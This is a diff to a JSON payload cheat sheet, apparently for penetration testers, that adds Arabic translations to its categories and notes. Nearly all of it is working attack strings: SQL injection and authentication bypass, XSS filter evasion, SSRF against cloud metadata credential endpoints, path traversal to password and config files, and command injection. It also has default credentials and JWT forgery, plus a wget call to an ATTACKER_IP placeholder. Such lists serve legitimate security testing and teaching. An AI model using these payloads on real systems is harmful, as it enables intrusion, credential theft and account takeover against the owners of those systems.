@@ -1,11 +1,17 @@
 [
   {
-    "cat": "SQL Injection",
-    "icon": "\ud83d\udc89",
+    "cat": {
+      "en": "SQL Injection",
+      "ar": "حقن SQL"
+    },
+    "icon": "💉",
     "color": "#dc2626",
     "groups": [
       {
-        "name": "Detection Probes",
+        "name": {
+          "en": "Detection Probes",
+          "ar": "اختبارات الكشف"
+        },
         "items": [
           "'",
           "\"",
@@ -14,10 +20,16 @@
           "'; SELECT sleep(3)--",
           "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"
         ],
-        "notes": "Start with single quote. Error message OR time delay = likely injectable."
+        "notes": {
+          "en": "Start with single quote. Error message OR time delay = likely injectable.",
+          "ar": "ابدأ بعلامة اقتباس مفردة. رسالة خطأ أو تأخير زمني = على الأرجح قابل للحقن."
+        }
       },
       {
-        "name": "Union-Based",
+        "name": {
+          "en": "Union-Based",
+          "ar": "قائم على UNION"
+        },
         "items": [
           "' ORDER BY 1--",
           "' ORDER BY 5--",
@@ -26,30 +38,48 @@
           "' UNION SELECT table_name,NULL FROM information_schema.tables--",
           "' UNION SELECT username,password FROM users--"
         ],
-        "notes": "Find column count with ORDER BY first. All NULLs until you find data types."
+        "notes": {
+          "en": "Find column count with ORDER BY first. All NULLs until you find data types.",
+          "ar": "حدد عدد الأعمدة باستخدام ORDER BY أولاً. كلها NULL حتى تجد أنواع البيانات."
+        }
       },
       {
-        "name": "Blind Boolean",
+        "name": {
+          "en": "Blind Boolean",
+          "ar": "أعمى منطقي (Boolean)"
+        },
         "items": [
           "' AND 1=1--",
           "' AND 1=2--",
           "' AND SUBSTRING(username,1,1)='a'--",
           "' AND (SELECT COUNT(*) FROM users)>0--"
         ],
-        "notes": "Compare true vs false page responses. Automate with SQLMap --technique=B"
+        "notes": {
+          "en": "Compare true vs false page responses. Automate with SQLMap --technique=B",
+          "ar": "قارن استجابات الصفحة الصحيحة والخاطئة. أتمتة عبر SQLMap --technique=B"
+        }
       },
       {
-        "name": "Time-Based Blind",
+        "name": {
+          "en": "Time-Based Blind",
+          "ar": "أعمى زمني"
+        },
         "items": [
           "'; IF(1=1) WAITFOR DELAY '0:0:5'-- (MSSQL)",
           "'; SELECT CASE WHEN(1=1) THEN sleep(5) ELSE 0 END-- (MySQL)",
           "'; SELECT pg_sleep(5)-- (PostgreSQL)",
           "'; SELECT 1 FROM dual WHERE 1=1 AND sleep(5)-- (Oracle)"
         ],
-        "notes": "Response > 5s = vulnerable. Use --technique=T in SQLMap for automation."
+        "notes": {
+          "en": "Response > 5s = vulnerable. Use --technique=T in SQLMap for automation.",
+          "ar": "استجابة أكثر من 5 ثوانٍ = ضعيف. استخدم --technique=T في SQLMap للأتمتة."
+        }
       },
       {
-        "name": "Authentication Bypass",
+        "name": {
+          "en": "Authentication Bypass",
+          "ar": "تجاوز المصادقة"
+        },
         "items": [
           "admin'--",
           "admin' OR '1'='1",
@@ -58,17 +88,26 @@
           "admin'/*",
           "') OR ('1'='1'--"
         ],
-        "notes": "Login form bypass. Try in both username and password fields. Check for second-order injection too."
+        "notes": {
+          "en": "Login form bypass. Try in both username and password fields. Check for second-order injection too.",
+          "ar": "تجاوز نموذج تسجيل الدخول. جرّب في حقلي اسم المستخدم وكلمة المرور. تحقق أيضاً من الحقن من الدرجة الثانية."
+        }
       }
     ]
   },
   {
-    "cat": "Cross-Site Scripting",
-    "icon": "\ud83d\udd27",
+    "cat": {
+      "en": "Cross-Site Scripting",
+      "ar": "البرمجة عبر المواقع (XSS)"
+    },
+    "icon": "🔧",
     "color": "#ea580c",
     "groups": [
       {
-        "name": "Basic Probes",
+        "name": {
+          "en": "Basic Probes",
+          "ar": "اختبارات أساسية"
+        },
         "items": [
           "<script>alert(document.domain)</script>",
           "<img src=x onerror=alert(document.domain)>",
@@ -76,30 +115,48 @@
           "<body onload=alert(1)>",
           "javascript:alert(document.domain)"
         ],
-        "notes": "Replace alert(1) with alert(document.domain) to prove same-origin execution. Show scope of impact."
+        "notes": {
+          "en": "Replace alert(1) with alert(document.domain) to prove same-origin execution. Show scope of impact.",
+          "ar": "استبدل alert(1) بـalert(document.domain) لإثبات التنفيذ بنفس المصدر. أظهر نطاق الأثر."
+        }
       },
       {
-        "name": "Attribute Context",
+        "name": {
+          "en": "Attribute Context",
+          "ar": "سياق السمة (Attribute)"
+        },
         "items": [
           "\" onmouseover=alert(1) x=\"",
           "' onmouseover=alert(1) x='",
           "\" autofocus onfocus=alert(1) \"",
           "\" style=animation-name:rotation onanimationstart=alert(1)//\""
         ],
-        "notes": "Breaking out of HTML attribute context. Must terminate the attribute value first."
+        "notes": {
+          "en": "Breaking out of HTML attribute context. Must terminate the attribute value first.",
+          "ar": "الخروج من سياق سمة HTML. يجب إنهاء قيمة السمة أولاً."
+        }
       },
       {
-        "name": "DOM-Based",
+        "name": {
+          "en": "DOM-Based",
+          "ar": "قائم على DOM"
+        },
         "items": [
           "#<img src=x onerror=alert(1)>",
           "#javascript:alert(1)",
           "?search=<script>alert(1)</script>",
           "location.hash.replace('#','')"
         ],
-        "notes": "Check JavaScript that reads location.hash, document.URL, document.referrer. Source \u2192 Sink analysis in Burp."
+        "notes": {
+          "en": "Check JavaScript that reads location.hash, document.URL, document.referrer. Source → Sink analysis in Burp.",
+          "ar": "افحص كود JavaScript الذي يقرأ location.hash وdocument.URL وdocument.referrer. تحليل المصدر ← الوجهة في Burp."
+        }
       },
       {
-        "name": "Filter Bypass",
+        "name": {
+          "en": "Filter Bypass",
+          "ar": "تجاوز المرشّح"
+        },
         "items": [
           "<ScRiPt>alert(1)</sCrIpT>",
           "<img src=x OnErRoR=alert(1)>",
@@ -107,17 +164,26 @@
           "<a href=javascript&colon;alert(1)>click",
           "<details/open/ontoggle=alert(1)>"
         ],
-        "notes": "WAF evasion. Use Burp Intruder + XSS payload list from SecLists. Check server-side encoding before output."
+        "notes": {
+          "en": "WAF evasion. Use Burp Intruder + XSS payload list from SecLists. Check server-side encoding before output.",
+          "ar": "تفادي WAF. استخدم Burp Intruder مع قائمة حمولات XSS من SecLists. تحقق من ترميز جانب الخادم قبل الإخراج."
+        }
       }
     ]
   },
   {
-    "cat": "SSRF",
-    "icon": "\ud83c\udf10",
+    "cat": {
+      "en": "SSRF",
+      "ar": "تزوير الطلب من جانب الخادم (SSRF)"
+    },
+    "icon": "🌐",
     "color": "#b45309",
     "groups": [
       {
-        "name": "Internal Network",
+        "name": {
+          "en": "Internal Network",
+          "ar": "الشبكة الداخلية"
+        },
         "items": [
           "http://127.0.0.1/",
           "http://localhost:8080/admin",
@@ -125,10 +191,16 @@
           "http://10.0.0.1/",
           "http://172.16.0.1/"
         ],
-        "notes": "Probe for internal services behind firewall. Common targets: admin panels, monitoring, databases."
+        "notes": {
+          "en": "Probe for internal services behind firewall. Common targets: admin panels, monitoring, databases.",
+          "ar": "اختبر الخدمات الداخلية خلف جدار الحماية. أهداف شائعة: لوحات الإدارة، المراقبة، قواعد البيانات."
+        }
       },
       {
-        "name": "Cloud Metadata (Critical)",
+        "name": {
+          "en": "Cloud Metadata (Critical)",
+          "ar": "بيانات تعريف السحابة (حرِج)"
+        },
         "items": [
           "http://169.254.169.254/latest/meta-data/ (AWS)",
           "http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS IAM keys)",
@@ -136,10 +208,16 @@
           "http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)",
           "http://100.100.100.200/latest/meta-data/ (Alibaba)"
         ],
-        "notes": "AWS metadata = IAM credentials = account takeover. Add header: Metadata-Flavor: Google for GCP."
+        "notes": {
+          "en": "AWS metadata = IAM credentials = account takeover. Add header: Metadata-Flavor: Google for GCP.",
+          "ar": "بيانات تعريف AWS = بيانات اعتماد IAM = الاستيلاء على الحساب. أضف الرأس: Metadata-Flavor: Google لـGCP."
+        }
       },
       {
-        "name": "Protocol Schemes",
+        "name": {
+          "en": "Protocol Schemes",
+          "ar": "مخططات البروتوكول"
+        },
         "items": [
           "file:///etc/passwd",
           "file:///etc/shadow",
@@ -148,17 +226,26 @@
           "gopher://localhost:25/",
           "ftp://localhost:21/"
         ],
-        "notes": "Try when http:// is blocked. file:// reads local files. gopher:// can send raw TCP to internal services."
+        "notes": {
+          "en": "Try when http:// is blocked. file:// reads local files. gopher:// can send raw TCP to internal services.",
+          "ar": "جرّب عندما يكون http:// محجوباً. file:// يقرأ الملفات المحلية. gopher:// يمكنه إرسال TCP خام لخدمات داخلية."
+        }
       }
     ]
   },
   {
-    "cat": "LFI / Path Traversal",
-    "icon": "\ud83d\udcc1",
+    "cat": {
+      "en": "LFI / Path Traversal",
+      "ar": "تضمين الملفات المحلية / اجتياز المسار"
+    },
+    "icon": "📁",
     "color": "#16a34a",
     "groups": [
       {
-        "name": "Basic Traversal",
+        "name": {
+          "en": "Basic Traversal",
+          "ar": "اجتياز أساسي"
+        },
         "items": [
           "../../../etc/passwd",
           "..\\..\\..\\Windows\\win.ini",
@@ -167,10 +254,16 @@
           "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
           "..%2f..%2f..%2fetc%2fpasswd"
         ],
-        "notes": "Double encoding bypasses simple filters. Count directory depth needed. Linux: /etc/passwd. Windows: C:\\Windows\\win.ini"
+        "notes": {
+          "en": "Double encoding bypasses simple filters. Count directory depth needed. Linux: /etc/passwd. Windows: C:\\Windows\\win.ini",
+          "ar": "الترميز المزدوج يتجاوز المرشحات البسيطة. احسب عمق الدليل المطلوب. Linux: /etc/passwd. Windows: C:\\Windows\\win.ini"
+        }
       },
       {
-        "name": "High-Value Files",
+        "name": {
+          "en": "High-Value Files",
+          "ar": "ملفات عالية القيمة"
+        },
         "items": [
           "/etc/passwd",
           "/etc/shadow",
@@ -181,10 +274,16 @@
           "C:\\inetpub\\wwwroot\\web.config",
           "C:\\xampp\\htdocs\\config.php"
         ],
-        "notes": "After confirming LFI, immediately go for /proc/self/environ (may contain secrets) and application config files."
+        "notes": {
+          "en": "After confirming LFI, immediately go for /proc/self/environ (may contain secrets) and application config files.",
+          "ar": "بعد تأكيد LFI، توجّه فوراً إلى /proc/self/environ (قد يحتوي أسراراً) وملفات إعداد التطبيق."
+        }
       },
       {
-        "name": "PHP Wrappers",
+        "name": {
+          "en": "PHP Wrappers",
+          "ar": "أغلفة PHP"
+        },
         "items": [
           "php://filter/convert.base64-encode/resource=index.php",
           "php://filter/read=string.rot13/resource=index.php",
@@ -192,17 +291,26 @@
           "expect://id",
           "php://input (with POST data)"
         ],
-        "notes": "php://filter reads source code as base64 without executing. data:// can lead to RCE if phar deserialization available."
+        "notes": {
+          "en": "php://filter reads source code as base64 without executing. data:// can lead to RCE if phar deserialization available.",
+          "ar": "php://filter يقرأ الكود المصدري كـbase64 دون تنفيذ. data:// قد يؤدي إلى RCE إن توفّر إلغاء تسلسل phar."
+        }
       }
     ]
   },
   {
-    "cat": "Command Injection",
-    "icon": "\ud83d\udcbb",
+    "cat": {
+      "en": "Command Injection",
+      "ar": "حقن الأوامر"
+    },
+    "icon": "💻",
     "color": "#6366f1",
     "groups": [
       {
-        "name": "Injection Separators",
+        "name": {
+          "en": "Injection Separators",
+          "ar": "فواصل الحقن"
+        },
         "items": [
           "; id",
           "| id",
@@ -214,10 +322,16 @@
           "; id #",
           "\n id"
         ],
-        "notes": "Try all separators. Behavior varies by OS and shell. Use Burp Repeater to test each manually."
+        "notes": {
+          "en": "Try all separators. Behavior varies by OS and shell. Use Burp Repeater to test each manually.",
+          "ar": "جرّب جميع الفواصل. السلوك يختلف حسب نظام التشغيل والصدفة. استخدم Burp Repeater لاختبار كل واحد يدوياً."
+        }
       },
       {
-        "name": "Blind Detection",
+        "name": {
+          "en": "Blind Detection",
+          "ar": "كشف أعمى"
+        },
         "items": [
           "| sleep 10",
           "& ping -n 10 127.0.0.1",
@@ -225,10 +339,16 @@
           "$(curl http://{BURP_COLLABORATOR}/test)",
           "| wget http://{ATTACKER_IP}:8080/test"
         ],
-        "notes": "Use Burp Collaborator for out-of-band detection. Time-based: compare baseline vs sleep response time."
+        "notes": {
+          "en": "Use Burp Collaborator for out-of-band detection. Time-based: compare baseline vs sleep response time.",
+          "ar": "استخدم Burp Collaborator للكشف خارج النطاق (out-of-band). زمني: قارن وقت الاستجابة الأساسي بوقت الاستجابة مع sleep."
+        }
       },
       {
-        "name": "Filter Bypass",
+        "name": {
+          "en": "Filter Bypass",
+          "ar": "تجاوز المرشّح"
+        },
         "items": [
           "cat /etc/pa'ss'wd",
           "c''at /etc/passwd",
@@ -237,17 +357,26 @@
           "$(printf '\\154\\163')  (ls in octal)",
           "IFS=,;cmd=c,a,t;$cmd /etc/passwd"
         ],
-        "notes": "When spaces or keywords are filtered. Use ${IFS} for spaces. Concatenation to bypass keyword filters."
+        "notes": {
+          "en": "When spaces or keywords are filtered. Use ${IFS} for spaces. Concatenation to bypass keyword filters.",
+          "ar": "عند تصفية المسافات أو الكلمات المفتاحية. استخدم ${IFS} للمسافات. الدمج لتجاوز مرشحات الكلمات المفتاحية."
+        }
       }
     ]
   },
   {
-    "cat": "Authentication Attacks",
-    "icon": "\ud83d\udd11",
+    "cat": {
+      "en": "Authentication Attacks",
+      "ar": "هجمات المصادقة"
+    },
+    "icon": "🔑",
     "color": "#8b5cf6",
     "groups": [
       {
-        "name": "Default Credentials",
+        "name": {
+          "en": "Default Credentials",
+          "ar": "بيانات اعتماد افتراضية"
+        },
         "items": [
           "admin:admin",
           "admin:password",
@@ -260,18 +389,27 @@
           "root:(blank)",
           "administrator:password"
         ],
-        "notes": "Always try defaults on every login. Internal systems, network gear, dev environments almost never change defaults."
+        "notes": {
+          "en": "Always try defaults on every login. Internal systems, network gear, dev environments almost never change defaults.",
+          "ar": "جرّب الافتراضيات دائماً في كل تسجيل دخول. الأنظمة الداخلية ومعدات الشبكة وبيئات التطوير نادراً ما تُغيّر الافتراضيات."
+        }
       },
       {
-        "name": "JWT Attacks",
+        "name": {
+          "en": "JWT Attacks",
+          "ar": "هجمات JWT"
+        },
         "items": [
-          "Change alg to 'none' \u2014 remove signature",
-          "Change alg from RS256 to HS256 \u2014 sign with public key",
+          "Change alg to 'none' — remove signature",
+          "Change alg from RS256 to HS256 — sign with public key",
           "Brute force weak HS256 secret (hashcat -a 0 -m 16500)",
           "Inject via kid parameter: ../../../dev/null",
           "Set exp to far future (year 2099)"
         ],
-        "notes": "Use jwt_tool: python3 jwt_tool.py {TOKEN} -T (tamper) or -C -d wordlist.txt (crack). None algorithm = no auth."
+        "notes": {
+          "en": "Use jwt_tool: python3 jwt_tool.py {TOKEN} -T (tamper) or -C -d wordlist.txt (crack). None algorithm = no auth.",
+          "ar": "استخدم jwt_tool: python3 jwt_tool.py {TOKEN} -T (تعديل) أو -C -d wordlist.txt (كسر). خوارزمية None = بدون مصادقة."
+        }
       }
     ]
   }
